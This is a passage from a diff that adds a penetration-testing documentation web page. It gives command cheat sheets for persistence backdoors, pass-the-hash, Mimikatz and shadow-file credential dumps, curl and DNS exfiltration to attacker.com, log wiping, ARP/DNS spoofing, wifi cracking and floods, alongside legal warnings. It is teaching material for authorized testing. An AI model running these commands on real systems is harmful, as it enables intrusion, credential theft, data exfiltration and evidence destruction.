+sc create Backdoor binPath= "C:\Windows\Temp\backdoor.exe" start= auto
+sc start Backdoor
+
+# WMI Event Subscription
+# PowerShell based persistence
+$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="Filter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";}</code></pre>
+                    </div>
+                </div>
+
+                <h2>Lateral Movement</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-network-wired"></i> Moving Through the Network</h3>
+                    <div class="code-block">
+                        <pre><code># Pass-the-Hash
+crackmapexec smb 192.168.1.0/24 -u Administrator -H hash --local-auth
+pth-winexe -U Administrator%hash //192.168.1.100 cmd
+
+# PSExec
+psexec.py domain/user:password@192.168.1.100
+
+# WMI
+wmiexec.py domain/user:password@192.168.1.100
+
+# RDP
+rdesktop -u user -p password 192.168.1.100
+xfreerdp /u:user /p:password /v:192.168.1.100
+
+# SSH tunneling
+ssh -L 8080:internal-server:80 user@jump-host
+ssh -D 9050 user@pivot-host  # SOCKS proxy
+
+# Port forwarding with Meterpreter
+portfwd add -l 3389 -p 3389 -r 192.168.1.100</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-project-diagram"></i> Network Pivoting</h3>
+                    <div class="code-block">
+                        <pre><code># Chisel (TCP tunneling over HTTP)
+# On attacker machine
+chisel server -p 8080 --reverse
+
+# On compromised host
+chisel client attacker_ip:8080 R:socks
+
+# Proxychains configuration
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
+proxychains nmap -sT 192.168.2.0/24
+
+# SSH dynamic port forwarding
+ssh -D 1080 user@pivot-host
+proxychains firefox  # Browse internal network</code></pre>
+                    </div>
+                </div>
+
+                <h2>Credential Harvesting</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-key"></i> Extracting Credentials</h3>
+                    <p><strong>Windows:</strong></p>
+                    <div class="code-block">
+                        <pre><code># Mimikatz
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+lsadump::sam
+lsadump::secrets
+
+# Dump SAM database
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+samdump2 system.hive sam.hive
+
+# NTDS.dit (Domain Controller)
+ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+
+# LaZagne (all-in-one)
+laZagne.exe all</code></pre>
+                    </div>
+
+                    <p><strong>Linux:</strong></p>
+                    <div class="code-block">
+                        <pre><code># /etc/shadow
+cat /etc/shadow
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+
+# SSH keys
+find / -name id_rsa 2>/dev/null
+find / -name id_dsa 2>/dev/null
+
+# Browser saved passwords
+# Firefox
+~/.mozilla/firefox/*/logins.json
+# Chrome
+~/.config/google-chrome/Default/Login Data
+
+# History files
+cat ~/.bash_history
+cat ~/.mysql_history
+cat ~/.psql_history</code></pre>
+                    </div>
+                </div>
+
+                <h2>Data Exfiltration</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-download"></i> Exfiltration Techniques</h3>
+                    <div class="code-block">
+                        <pre><code># HTTP/HTTPS exfiltration
+curl -X POST -F "file=@/etc/passwd" http://attacker.com/upload
+wget --post-file=/etc/passwd http://attacker.com/upload
+
+# DNS exfiltration
+for data in $(cat /etc/passwd | base64); do
+    dig $data.attacker.com
+done
+
+# ICMP exfiltration
+hping3 --icmp --data 100 attacker.com
+
+# SCP/SFTP
+scp sensitive.txt user@attacker.com:/tmp/
+sftp user@attacker.com
+
+# SMB
+smbclient //attacker.com/share -c 'put sensitive.txt'
+
+# Base64 encode and copy
+base64 sensitive.txt
+# Paste into terminal on attacker machine and decode</code></pre>
+                    </div>
+                </div>
+
+                <h2>Covering Tracks</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-eraser"></i> Anti-Forensics</h3>
+                    <div class="code-block">
+                        <pre><code># Clear Linux logs
+echo "" > /var/log/auth.log
+echo "" > /var/log/syslog
+echo "" > ~/.bash_history
+history -c
+
+# Clear Windows logs
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+
+# Clear specific entries
+# Linux
+sed -i '/192.168.1.100/d' /var/log/auth.log
+
+# Timestomp (modify file timestamps)
+touch -r original.txt backdoor.exe  # Match timestamps
+
+# Disable logging temporarily
+service rsyslog stop  # Linux
+Stop-Service EventLog  # Windows PowerShell</code></pre>
+                    </div>
+                </div>
+
+                <h2>Post-Exploitation Tools</h2>
+                <table class="options-table">
+                    <tr>
+                        <th>Tool</th>
+                        <th>Purpose</th>
+                        <th>Platform</th>
+                    </tr>
+                    <tr>
+                        <td><strong>Mimikatz</strong></td>
+                        <td>Credential extraction</td>
+                        <td>Windows</td>
+                    </tr>
+                    <tr>
+                        <td><strong>BloodHound</strong></td>
+                        <td>Active Directory mapping</td>
+                        <td>Windows/Linux</td>
+                    </tr>
+                    <tr>
+                        <td><strong>LinPEAS/WinPEAS</strong></td>
+                        <td>Privilege escalation enumeration</td>
+                        <td>Linux/Windows</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Empire/Covenant</strong></td>
+                        <td>Post-exploitation framework</td>
+                        <td>Windows/Linux</td>
+                    </tr>
+                    <tr>
+                        <td><strong>CrackMapExec</strong></td>
+                        <td>Network exploitation</td>
+                        <td>Linux</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- OSINT -->
+            <section id="osint" class="doc-section">
+                <h1><i class="fas fa-user-secret"></i> Open Source Intelligence (OSINT)</h1>
+
+                <p>
+                    OSINT involves collecting and analyzing publicly available information to gather
+                    intelligence about a target. It's a critical part of reconnaissance.
+                </p>
+
+                <h2>OSINT Categories</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-globe"></i> Domain Intelligence</h3>
+                    <ul>
+                        <li>WHOIS records and registration history</li>
+                        <li>DNS records (A, AAAA, MX, TXT, etc.)</li>
+                        <li>Subdomain enumeration</li>
+                        <li>SSL/TLS certificate information</li>
+                        <li>Historical DNS data</li>
+                    </ul>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-envelope"></i> Email Intelligence</h3>
+                    <ul>
+                        <li>Email format patterns</li>
+                        <li>Employee email addresses</li>
+                        <li>Email breach databases</li>
+                        <li>Email headers and routing</li>
+                    </ul>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-users"></i> People & Social Media</h3>
+                    <ul>
+                        <li>LinkedIn employee profiles</li>
+                        <li>GitHub accounts and repositories</li>
+                        <li>Twitter/X mentions and discussions</li>
+                        <li>Stack Overflow profiles</li>
+                        <li>Personal blogs and websites</li>
+                    </ul>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-code-branch"></i> Code & Technology</h3>
+                    <ul>
+                        <li>GitHub repositories</li>
+                        <li>Technology stack analysis</li>
+                        <li>Leaked credentials in code</li>
+                        <li>API endpoints and documentation</li>
+                    </ul>
+                </div>
+
+                <h2>OSINT Tools</h2>
+                <div class="code-block">
+                    <pre><code># Comprehensive OSINT scan
+python3 penetration-test.py osint example.com --deep
+
+# Domain intelligence
+whois example.com
+dig example.com ANY
+
+# Subdomain enumeration
+python3 penetration-test.py scan example.com --plugin subdominator
+
+# Search engine dorking
+site:example.com filetype:pdf
+site:example.com inurl:admin
+site:github.com "example.com" "api_key"</code></pre>
+                </div>
+            </section>
+
+            <!-- Web Security -->
+            <section id="web-security" class="doc-section">
+                <h1><i class="fas fa-globe"></i> Web Application Security</h1>
+
+                <p>
+                    Web applications are a primary target for attackers due to their accessibility and
+                    frequent vulnerabilities. Understanding OWASP Top 10 is essential.
+                </p>
+
+                <h2>OWASP Top 10 (2021)</h2>
+
+                <div class="methodology-steps">
+                    <div class="step">
+                        <h3>Broken Access Control</h3>
+                        <p>
+                            Restrictions on what authenticated users can do are not properly enforced.
+                            Attackers can exploit these flaws to access unauthorized functionality or data.
+                        </p>
+                    </div>
+
+                    <div class="step">
+                        <h3>Cryptographic Failures</h3>
+                        <p>
+                            Failures related to cryptography which often lead to exposure of sensitive data.
+                            Includes weak encryption, hardcoded keys, and improper storage.
+                        </p>
+                    </div>
+
+                    <div class="step">
+                        <h3>Injection</h3>
+                        <p>
+                            SQL, NoSQL, OS command, and LDAP injection occur when untrusted data is sent
+                            to an interpreter as part of a command or query.
+                        </p>
+                    </div>
+
+                    <div class="step">
+                        <h3>Insecure Design</h3>
+                        <p>
+                            A broad category representing different weaknesses in design and architecture,
+                            with a focus on risks related to design flaws.
+                        </p>
+                    </div>
+
+                    <div class="step">
+                        <h3>Security Misconfiguration</h3>
+                        <p>
+                            Missing appropriate security hardening across any part of the application stack,
+                            or improperly configured permissions on cloud services.
+                        </p>
+                    </div>
+
+                    <div class="step">
+                        <h3>Vulnerable and Outdated Components</h3>
+                        <p>
+                            Using components with known vulnerabilities. This includes libraries, frameworks,
+                            and other software modules.
+                        </p>
+                    </div>
+
+                    <div class="step">
+                        <h3>Identification and Authentication Failures</h3>
+                        <p>
+                            Authentication and session management implemented incorrectly, allowing attackers
+                            to compromise passwords, keys, or session tokens.
+                        </p>
+                    </div>
+
+                    <div class="step">
+                        <h3>Software and Data Integrity Failures</h3>
+                        <p>
+                            Code and infrastructure that does not protect against integrity violations,
+                            including insecure CI/CD pipelines and auto-update functionality.
+                        </p>
+                    </div>
+
+                    <div class="step">
+                        <h3>Security Logging and Monitoring Failures</h3>
+                        <p>
+                            Without logging and monitoring, breaches cannot be detected. Insufficient logging
+                            and ineffective integration with incident response systems.
+                        </p>
+                    </div>
+
+                    <div class="step">
+                        <h3>Server-Side Request Forgery (SSRF)</h3>
+                        <p>
+                            Occurs when a web application fetches a remote resource without validating the
+                            user-supplied URL, allowing attackers to coerce the application to send requests
+                            to an unintended destination.
+                        </p>
+                    </div>
+                </div>
+
+                <h2>Web Testing Tools</h2>
+                <div class="code-block">
+                    <pre><code># Web vulnerability scanning
+python3 penetration-test.py scan example.com --categories vuln_scan
+
+# Directory fuzzing
+ffuf -u https://example.com/FUZZ -w wordlist.txt
+
+# Web crawling
+python3 penetration-test.py scan example.com --plugin katana_crawler
+
+# XSS detection
+python3 penetration-test.py scan example.com --plugin dalfox_xss
+
+# 403 bypass
+python3 penetration-test.py scan example.com --plugin 403_bypass</code></pre>
+                </div>
+            </section>
+
+            <!-- Network Security -->
+            <section id="network-security" class="doc-section">
+                <h1><i class="fas fa-network-wired"></i> Network Security</h1>
+
+                <p>
+                    Network security focuses on protecting computer networks from unauthorized access,
+                    misuse, modification, or denial of network-accessible resources. Understanding network
+                    protocols, services, and attack vectors is essential for penetration testing.
+                </p>
+
+                <h2>Network Protocols</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-layer-group"></i> TCP/IP Stack</h3>
+                    <table class="options-table">
+                        <tr>
+                            <th>Layer</th>
+                            <th>Protocols</th>
+                            <th>Common Attacks</th>
+                        </tr>
+                        <tr>
+                            <td><strong>Application</strong></td>
+                            <td>HTTP, FTP, SMTP, DNS</td>
+                            <td>Protocol exploitation, injection attacks</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Transport</strong></td>
+                            <td>TCP, UDP</td>
+                            <td>Port scanning, session hijacking</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Network</strong></td>
+                            <td>IP, ICMP</td>
+                            <td>IP spoofing, man-in-the-middle</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Data Link</strong></td>
+                            <td>Ethernet, ARP</td>
+                            <td>ARP spoofing, MAC flooding</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <h2>Network Attacks</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-exchange-alt"></i> Man-in-the-Middle (MITM)</h3>
+                    <p>Intercepting communications between two parties:</p>
+                    <div class="code-block">
+                        <pre><code># ARP Spoofing with Ettercap
+ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.100/
+
+# ARP Spoofing with arpspoof
+arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+
+# Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# SSL Stripping with sslstrip
+sslstrip -l 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+# DNS Spoofing
+# Edit /etc/ettercap/etter.dns
+example.com A 192.168.1.50
+ettercap -T -M arp:remote -P dns_spoof /192.168.1.1/ /192.168.1.100/</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-wifi"></i> Wireless Network Attacks</h3>
+                    <div class="code-block">
+                        <pre><code># Monitor mode
+airmon-ng start wlan0
+
+# Capture handshake
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Deauth attack
+aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+# Crack WPA/WPA2
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+# WPS attack
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+
+# Evil Twin attack
+hostapd-wpe hostapd-wpe.conf
+
+# Rogue AP with WiFi-Pumpkin
+wifi-pumpkin3</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-shield-virus"></i> Denial of Service (DoS)</h3>
+                    <div class="code-block">
+                        <pre><code># SYN Flood
+hping3 -S --flood -V -p 80 target.com
+
+# UDP Flood
+hping3 --udp --flood -V -p 53 target.com
+
+# ICMP Flood (Ping Flood)
+hping3 --icmp --flood -V target.com
+
+# Slowloris (Application Layer DoS)
+slowloris -s 500 target.com
+
+# Note: DoS attacks should ONLY be performed in
+# authorized testing environments. Unauthorized
+# DoS is illegal and can cause significant damage.</code></pre>
+                    </div>
+                    <div class="alert alert-danger">
+                        <strong>⚠️ WARNING:</strong> DoS/DDoS attacks should NEVER be performed without explicit
+                        authorization. These attacks are illegal and can cause serious harm to services.
+                    </div>
+                </div>
+
+                <h2>Network Sniffing and Analysis</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-microscope"></i> Packet Capture and Analysis</h3>
+                    <div class="code-block">
+                        <pre><code># Tcpdump - Capture packets
+tcpdump -i eth0 -w capture.pcap
+tcpdump -i eth0 port 80 -w http.pcap
+tcpdump -i eth0 src 192.168.1.100 -w source.pcap
+
+# Tcpdump filters
+tcpdump -i eth0 'tcp port 80 or tcp port 443'
+tcpdump -i eth0 'host 192.168.1.100'
+tcpdump -i eth0 'net 192.168.1.0/24'
+
+# Wireshark - GUI analysis
+wireshark
+
+# Tshark - CLI Wireshark
+tshark -i eth0 -Y 'http.request.method == "POST"'
+tshark -r capture.pcap -Y 'http'
+
+# Extract HTTP objects
+tshark -r capture.pcap --export-objects http,/tmp/objects/
+
+# Network Miner - Extract files from PCAP
+networkminer capture.pcap</code></pre>
+                    </div>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-user-secret"></i> Credential Sniffing</h3>
+                    <div class="code-block">
+                        <pre><code># Responder - Capture NTLM hashes
+responder -I eth0 -rdwv
+
+# Net-creds - Sniff passwords from interface
+net-creds.py -i eth0
+
+# PCredz - Extract credentials from PCAP
+Pcredz -f capture.pcap
+
+# Ettercap filters for passwords
+ettercap -T -q -i eth0 -F filter.ef -M arp:remote /192.168.1.1/ //</code></pre>
+                    </div>
+                </div>
+
+                <h2>VPN and Tunnel Security</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-shield-alt"></i> VPN Testing</h3>
+                    <div class="code-block">
+                        <pre><code># OpenVPN enumeration
+nmap -sU -p 1194 --script openvpn-info target.com
+
+# IPSec enumeration
+ike-scan target.com
+ike-scan -M target.com  # Aggressive mode
+
+# PPTP vulnerabilities
+nmap -p 1723 --script pptp-version target.com
+
+# SSL VPN testing
+sslyze --regular target.com:443</code></pre>
+                    </div>
+                </div>
+
+                <h2>Firewall and IDS/IPS Evasion</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-mask"></i> Evasion Techniques</h3>
+                    <div class="code-block">
+                        <pre><code># Nmap firewall evasion
+# Fragment packets
+nmap -f target.com
+
+# Decoy scan
+nmap -D RND:10 target.com
+nmap -D decoy1,decoy2,ME,decoy3 target.com
+
+# Source port manipulation
+nmap --source-port 53 target.com
+
+# Timing templates (slower = more stealthy)
+nmap -T0 target.com  # Paranoid
+nmap -T1 target.com  # Sneaky
+
+# Randomize host order
+nmap --randomize-hosts target.com
+
+# Custom packet crafting with hping3
+hping3 -S -p 80 --tcp-timestamp --badcksum target.com
+
+# WAF bypass techniques
+# Parameter pollution
+?id=1&id=2
+
+# HTTP verb tampering
+POST /admin HTTP/1.1  # Change to TRACE
+
+# Case manipulation
+/AdMiN/
+
+# Encoding
+/%61%64%6d%69%6e/  # URL encoding
+/\x61\x64\x6d\x69\x6e/  # Unicode encoding</code></pre>
+                    </div>
+                </div>
+
+                <h2>Network Segmentation Testing</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-sitemap"></i> VLAN Hopping</h3>
+                    <div class="code-block">
+                        <pre><code># VLAN hopping with Yersinia
+yersinia -G  # GUI mode
+
+# Double tagging attack
+# Requires two VLANs and native VLAN configuration
+
+# Switch Spoofing (DTP attack)
+# Configure interface to trunk mode
+modprobe 8021q
+vconfig add eth0 10
+ifconfig eth0.10 192.168.10.1 netmask 255.255.255.0 up
+
+# Testing with scapy
+from scapy.all import *
+packet = Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst="192.168.20.1")/ICMP()
+sendp(packet, iface="eth0")</code></pre>
+                    </div>
+                </div>
+
+                <h2>IPv6 Security</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-globe"></i> IPv6 Attacks</h3>
+                    <div class="code-block">
+                        <pre><code># IPv6 scanning
+nmap -6 fe80::1%eth0
+ping6 -I eth0 ff02::1  # Ping all hosts on link
+
+# THC-IPv6 toolkit
+# Router Advertisement flooding
+flood_router6 eth0
+
+# Neighbor Discovery spoofing
+parasite6 eth0
+
+# Fake DHCPv6 server
+fake_dhcps6 eth0
+
+# MitM with IPv6
+mitm6 -i eth0 -d domain.local</code></pre>
+                    </div>
+                </div>
+
+                <h2>Network Security Tools</h2>
+                <table class="options-table">
+                    <tr>
+                        <th>Tool</th>
+                        <th>Purpose</th>
+                        <th>Usage</th>
+                    </tr>
+                    <tr>
+                        <td><strong>Nmap</strong></td>
+                        <td>Network scanner</td>
+                        <td>Port scanning, service detection</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Wireshark</strong></td>
+                        <td>Packet analyzer</td>
+                        <td>Traffic analysis, protocol debugging</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Ettercap</strong></td>
+                        <td>MITM framework</td>
+                        <td>ARP spoofing, sniffing, filtering</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Responder</strong></td>
+                        <td>LLMNR/NBT-NS poisoner</td>
+                        <td>Credential capture</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Aircrack-ng</strong></td>
+                        <td>WiFi security suite</td>
+                        <td>WEP/WPA cracking</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Bettercap</strong></td>
+                        <td>Network attack framework</td>
+                        <td>MITM, sniffing, spoofing</td>
+                    </tr>
+                </table>
+
+                <h2>Network Security Best Practices</h2>
+                <div class="concept-card">
+                    <ul>
+                        <li><strong>Segmentation:</strong> Use VLANs and subnets to isolate network segments</li>
+                        <li><strong>Encryption:</strong> Use VPNs and encrypted protocols (HTTPS, SSH, SFTP)</li>
+                        <li><strong>Monitoring:</strong> Implement IDS/IPS and SIEM solutions</li>
+                        <li><strong>Access Control:</strong> Use firewalls and ACLs to restrict traffic</li>
+                        <li><strong>Authentication:</strong> Implement 802.1X for network access control</li>
+                        <li><strong>Updates:</strong> Keep network devices and firmware updated</li>
+                        <li><strong>Hardening:</strong> Disable unnecessary services and protocols</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Reporting -->
+            <section id="reporting" class="doc-section">
+                <h1><i class="fas fa-file-alt"></i> Penetration Testing Reports</h1>
+
+                <p>
+                    A well-written report is crucial for communicating findings and recommendations. It should
+                    be clear, actionable, and tailored to the audience.
+                </p>
+
+                <h2>Report Structure</h2>
+
+                <div class="concept-card">
+                    <h3>1. Executive Summary</h3>
+                    <p>High-level overview for non-technical stakeholders:</p>
+                    <ul>
+                        <li>Overall risk assessment</li>
+                        <li>Key findings summary</li>
+                        <li>Business impact</li>
+                        <li>Critical recommendations</li>
+                    </ul>
+                </div>
+
+                <div class="concept-card">
+                    <h3>2. Methodology</h3>
+                    <p>Detailed description of the testing process:</p>
+                    <ul>
+                        <li>Scope and limitations</li>
+                        <li>Testing approach</li>
+                        <li>Tools used</li>
+                        <li>Timeline</li>
+                    </ul>
+                </div>
+
+                <div class="concept-card">
+                    <h3>3. Technical Findings</h3>
+                    <p>Detailed vulnerability information:</p>
+                    <ul>
+                        <li>Vulnerability description</li>
+                        <li>Severity rating (CVSS)</li>
+                        <li>Proof of concept</li>
+                        <li>Affected systems/components</li>
+                        <li>Remediation steps</li>
+                    </ul>
+                </div>
+
+                <div class="concept-card">
+                    <h3>4. Appendices</h3>
+                    <p>Supporting information:</p>
+                    <ul>
+                        <li>Full scan results</li>
+                        <li>Screenshots and evidence</li>
+                        <li>Tool outputs</li>
+                        <li>References and resources</li>
+                    </ul>
+                </div>
+
+                <h2>Generating Reports</h2>
+                <div class="code-block">
+                    <pre><code># Generate comprehensive report
+python3 penetration-test.py report --type comprehensive --format html json
+
+# Filter by severity
+python3 penetration-test.py report --severity critical high
+
+# Filter by domain
+python3 penetration-test.py report --domain example.com
+
+# Filter by vulnerability type
+python3 penetration-test.py report --vuln-type xss sqli
+
+# Custom date range
+python3 penetration-test.py report --from 2024-01-01 --to 2024-12-31</code></pre>
+                </div>
+            </section>
+
+            <!-- Legal & Ethical -->
+            <section id="legal-ethical" class="doc-section">
+                <h1><i class="fas fa-balance-scale"></i> Legal & Ethical Considerations</h1>
+
+                <div class="alert alert-danger">
+                    <strong>⚠️ WARNING:</strong> Unauthorized access to computer systems is illegal in most
+                    jurisdictions. Always obtain proper authorization before conducting any security testing.
+                </div>
+
+                <h2>Legal Requirements</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-file-contract"></i> Authorization</h3>
+                    <p>Always obtain written authorization before testing:</p>
+                    <ul>
+                        <li>Signed contract or letter of authorization</li>
+                        <li>Clearly defined scope</li>
+                        <li>Specified testing windows</li>
+                        <li>Contact information for emergencies</li>
+                        <li>Rules of engagement</li>
+                    </ul>
+                </div>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-shield-alt"></i> Scope Limitations</h3>
+                    <p>Stay within the agreed scope:</p>
+                    <ul>
+                        <li>Only test authorized systems</li>
+                        <li>Respect time windows</li>
+                        <li>Avoid testing production during business hours (unless authorized)</li>
+                        <li>Do not cause denial of service</li>
+                        <li>Do not access or modify data beyond what's necessary for PoC</li>
+                    </ul>
+                </div>
+
+                <h2>Ethical Guidelines</h2>
+
+                <div class="concept-card">
+                    <h3><i class="fas fa-handshake"></i> Professional Conduct</h3>
+                    <ul>
+                        <li>Maintain confidentiality</li>
+                        <li>Protect client data</li>
+                        <li>Report all findings honestly</li>
+                        <li>Don't exploit vulnerabilities beyond demonstration</li>
+                        <li>Provide actionable remediation advice</li>
+                    </ul>
+                </div>
+
+                <h2>Common Legal Frameworks</h2>
+                <ul>
+                    <li><strong>Computer Fraud and Abuse Act (CFAA)</strong> - United States</li>
+                    <li><strong>Computer Misuse Act</strong> - United Kingdom</li>
+                    <li><strong>GDPR</strong> - European Union (data protection)</li>
+                    <li><strong>PCI DSS</strong> - Payment card industry standards</li>
+                    <li><strong>HIPAA</strong> - Healthcare data protection (US)</li>
+                </ul>
+
+                <div class="alert alert-info">
+                    <strong>ℹ️ Best Practice:</strong> Always consult with legal counsel before conducting
+                    penetration tests, especially for client engagements or cross-border testing.
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <script src="js/main.js"></script>
+    <script src="js/docs.js"></script>
+</body>
+</html>
